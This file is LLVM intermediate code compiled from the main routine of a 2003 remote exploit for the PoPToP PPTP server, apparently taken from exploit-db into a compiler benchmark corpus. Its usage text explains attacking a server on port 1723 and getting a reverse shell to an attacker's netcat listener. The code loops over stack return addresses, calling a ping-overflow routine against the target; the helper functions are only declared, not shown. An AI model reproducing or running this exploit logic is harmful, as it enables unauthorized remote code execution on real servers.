; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_16.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_16.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32, i32 }

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"                   D  H     H                            \0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"                   D  H     H     T\0A\00", align 1
@.str.3 = private unnamed_addr constant [59 x i8] c"                   D  H  H  H     T     EE    AA   M   M \0A\00", align 1
@.str.4 = private unnamed_addr constant [59 x i8] c"               DDD D  HHHHHHH     T    E  E  A  A  MM MM \0A\00", align 1
@.str.5 = private unnamed_addr constant [59 x i8] c"              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \0A\00", align 1
@.str.6 = private unnamed_addr constant [59 x i8] c"             D     D  H     H     T    EEE   AAAA  M M M \0A\00", align 1
@.str.7 = private unnamed_addr constant [59 x i8] c"              D    D  H     H     T    E     A  A  M   M \0A\00", align 1
@.str.8 = private unnamed_addr constant [60 x i8] c"               DDDD   H     H      TTT  EEE  A  A  M   M   \00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c" ... presents ... \0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [85 x i8] c"Exploit for PoPToP PPTP server older than \0A1.1.4-b3 and 1.1.3-20030409 under Linux.\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"by .einstein., April 2003.\0A\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"usage: \0A\00", align 1
@.str.13 = private unnamed_addr constant [59 x i8] c"  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [70 x i8] c"    <pptp_server> is the ip address or hostname of the PoPToP server\0A\00", align 1
@.str.15 = private unnamed_addr constant [61 x i8] c"      you want to attack.  Port 1723 is used for connection\0A\00", align 1
@.str.16 = private unnamed_addr constant [64 x i8] c"    <your_ip> and <your_port> - specify an ip address to which\0A\00", align 1
@.str.17 = private unnamed_addr constant [65 x i8] c"      a connection is possible to port <your_port> and set up a\0A\00", align 1
@.str.18 = private unnamed_addr constant [52 x i8] c"      netcat listener. You'll get a reverse shell.\0A\00", align 1
@.str.19 = private unnamed_addr constant [76 x i8] c"    <timeout> is a delay between stack bruteforce attemts, in milliseconds\0A\00", align 1
@.str.20 = private unnamed_addr constant [64 x i8] c"   If you only pass a single parameter, the program will check\0A\00", align 1
@.str.21 = private unnamed_addr constant [66 x i8] c"   whether remote server is vulnerable or not. Otherwise it will\0A\00", align 1
@.str.22 = private unnamed_addr constant [30 x i8] c"   perform a ret bruteforce.\0A\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"usage examples:\0A\00", align 1
@.str.24 = private unnamed_addr constant [35 x i8] c"  %s 192.168.1.2 192.168.1.1 5555\0A\00", align 1
@.str.25 = private unnamed_addr constant [61 x i8] c"    attack 192.168.1.2 and get a reverse shell on port 5555\0A\00", align 1
@.str.26 = private unnamed_addr constant [35 x i8] c"  %s 127.0.0.1 127.0.0.1 6666 100\0A\00", align 1
@.str.27 = private unnamed_addr constant [61 x i8] c"    attack a locally running pptpd with a timeout of 100 ms\0A\00", align 1
@.str.28 = private unnamed_addr constant [35 x i8] c"    and get a shell on port 6666.\0A\00", align 1
@.str.29 = private unnamed_addr constant [19 x i8] c"  %s 192.168.1.56\0A\00", align 1
@.str.30 = private unnamed_addr constant [63 x i8] c"    check if the PoPToP server on 192.168.1.56 is vulnerable.\0A\00", align 1
@.str.31 = private unnamed_addr constant [41 x i8] c"\0AChecking if the server is vulnerable..\0A\00", align 1
@.str.32 = private unnamed_addr constant [42 x i8] c"(if it is you have to wait 65 seconds)..\0A\00", align 1
@st = common dso_local global i32 0, align 4
@.str.33 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.34 = private unnamed_addr constant [18 x i8] c"PoPToP server is \00", align 1
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.35 = private unnamed_addr constant [13 x i8] c"vulnerable!\0A\00", align 1
@.str.36 = private unnamed_addr constant [16 x i8] c"not vulnerable\0A\00", align 1
@.str.37 = private unnamed_addr constant [38 x i8] c"[!] Attempting bruteforce against %s\0A\00", align 1
@.str.38 = private unnamed_addr constant [53 x i8] c"interrupt when you get a shell to %s on port %d...\0A\0A\00", align 1
@TOPOFSTACK = common dso_local global i32 0, align 4
@BOTTOMOFSTACK = common dso_local global i32 0, align 4
@.str.39 = private unnamed_addr constant [5 x i8] c"[*] \00", align 1
@.str.40 = private unnamed_addr constant [13 x i8] c"[ret=0x%x]..\00", align 1
@.str.41 = private unnamed_addr constant [18 x i8] c"sending payload..\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@STEP = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.TYPE_4__, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.3, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.4, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.5, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.6, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.7, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.8, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.10, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %27 = load i32, i32* %4, align 4
  %28 = icmp slt i32 %27, 2
  br i1 %28, label %29, label %61

29:                                               ; preds = %2
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0))
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.13, i64 0, i64 0), i8* %33)
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.14, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.15, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.16, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.17, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.18, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.19, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.20, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.21, i64 0, i64 0))
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.22, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i64 0, i64 0))
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.24, i64 0, i64 0), i8* %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.25, i64 0, i64 0))
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.26, i64 0, i64 0), i8* %52)
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.27, i64 0, i64 0))
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0))
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 0
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.29, i64 0, i64 0), i8* %58)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.30, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %174

61:                                               ; preds = %2
  store i32 500, i32* %6, align 4
  %62 = load i32, i32* %4, align 4
  %63 = icmp sge i32 %62, 5
  br i1 %63, label %64, label %69

64:                                               ; preds = %61
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 4
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @atoi(i8* %67)
  store i32 %68, i32* %6, align 4
  br label %69

69:                                               ; preds = %64, %61
  store i32 257, i32* %7, align 4
  %70 = load i32, i32* %7, align 4
  %71 = call i32 @WSAStartup(i32 %70, i32* %8)
  %72 = load i32, i32* %4, align 4
  %73 = icmp eq i32 %72, 2
  br i1 %73, label %74, label %120

74:                                               ; preds = %69
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 1
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @connect_server(i8* %77)
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %81, label %80

80:                                               ; preds = %74
  store i32 1, i32* %3, align 4
  br label %174

81:                                               ; preds = %74
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.31, i64 0, i64 0))
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.32, i64 0, i64 0))
  %84 = load i32, i32* @st, align 4
  %85 = call i32 @send_init_request(i32 %84)
  store i32 16843009, i32* %9, align 4
  %86 = load i32, i32* @st, align 4
  %87 = bitcast %struct.TYPE_4__* %11 to i8*
  %88 = call i32 @recv(i32 %86, i8* %87, i32 2, i32 0)
  store i32 %88, i32* %10, align 4
  %89 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %11, i32 0, i32 0
  %90 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %89, i32 0, i32 1
  %91 = load i32, i32* %90, align 4
  %92 = call i32 @ntohs(i32 %91)
  store i32 %92, i32* %10, align 4
  %93 = load i32, i32* @st, align 4
  %94 = bitcast %struct.TYPE_4__* %11 to i8*
  %95 = getelementptr inbounds i8, i8* %94, i64 2
  %96 = load i32, i32* %10, align 4
  %97 = sub nsw i32 %96, 2
  %98 = call i32 @recv(i32 %93, i8* %95, i32 %97, i32 0)
  store i32 %98, i32* %10, align 4
  %99 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %11, i32 0, i32 0
  %100 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @htons(i32 %101)
  store i32 %102, i32* %12, align 4
  %103 = load i32, i32* @st, align 4
  %104 = load i32, i32* %9, align 4
  %105 = call i32 @send_ping_overflow(i32 %103, i32 %104, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i64 0, i64 0), i32 0)
  %106 = load i32, i32* @st, align 4
  %107 = bitcast %struct.TYPE_4__* %11 to i8*
  %108 = call i32 @recv(i32 %106, i8* %107, i32 2, i32 0)
  store i32 %108, i32* %10, align 4
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.34, i64 0, i64 0))
  %110 = load i32, i32* %10, align 4
  %111 = load i32, i32* @SOCKET_ERROR, align 4
  %112 = icmp ne i32 %110, %111
  br i1 %112, label %113, label %115

113:                                              ; preds = %81
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0))
  br label %117

115:                                              ; preds = %81
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.36, i64 0, i64 0))
  br label %117

117:                                              ; preds = %115, %113
  %118 = load i32, i32* @st, align 4
  %119 = call i32 @closesocket(i32 %118)
  store i32 1, i32* %3, align 4
  br label %174

120:                                              ; preds = %69
  %121 = load i8**, i8*** %5, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 1
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.37, i64 0, i64 0), i8* %123)
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = load i8**, i8*** %5, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 3
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @atoi(i8* %130)
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.38, i64 0, i64 0), i8* %127, i32 %131)
  store i32 0, i32* %13, align 4
  %133 = load i32, i32* @TOPOFSTACK, align 4
  store i32 %133, i32* %9, align 4
  br label %134

134:                                              ; preds = %167, %120
  %135 = load i32, i32* %9, align 4
  %136 = load i32, i32* @BOTTOMOFSTACK, align 4
  %137 = icmp sge i32 %135, %136
  br i1 %137, label %138, label %173

138:                                              ; preds = %134
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0))
  %140 = load i8**, i8*** %5, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 1
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @connect_server(i8* %142)
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %146, label %145

145:                                              ; preds = %138
  store i32 1, i32* %3, align 4
  br label %174

146:                                              ; preds = %138
  %147 = load i32, i32* %9, align 4
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.40, i64 0, i64 0), i32 %147)
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.41, i64 0, i64 0))
  %150 = load i32, i32* @st, align 4
  %151 = call i32 @send_init_request(i32 %150)
  %152 = load i32, i32* @st, align 4
  %153 = load i32, i32* %9, align 4
  %154 = load i8**, i8*** %5, align 8
  %155 = getelementptr inbounds i8*, i8** %154, i64 2
  %156 = load i8*, i8** %155, align 8
  %157 = load i8**, i8*** %5, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 3
  %159 = load i8*, i8** %158, align 8
  %160 = call i32 @atoi(i8* %159)
  %161 = call i32 @send_ping_overflow(i32 %152, i32 %153, i8* %156, i32 %160)
  %162 = load i32, i32* @st, align 4
  %163 = call i32 @closesocket(i32 %162)
  %164 = load i32, i32* %6, align 4
  %165 = call i32 @Sleep(i32 %164)
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i64 0, i64 0))
  br label %167

167:                                              ; preds = %146
  %168 = load i64, i64* @STEP, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = sub nsw i64 %170, %168
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %9, align 4
  br label %134

173:                                              ; preds = %134
  store i32 0, i32* %3, align 4
  br label %174

174:                                              ; preds = %173, %145, %117, %80, %29
  %175 = load i32, i32* %3, align 4
  ret i32 %175
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @connect_server(i8*) #1

declare dso_local i32 @send_init_request(i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @send_ping_overflow(i32, i32, i8*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
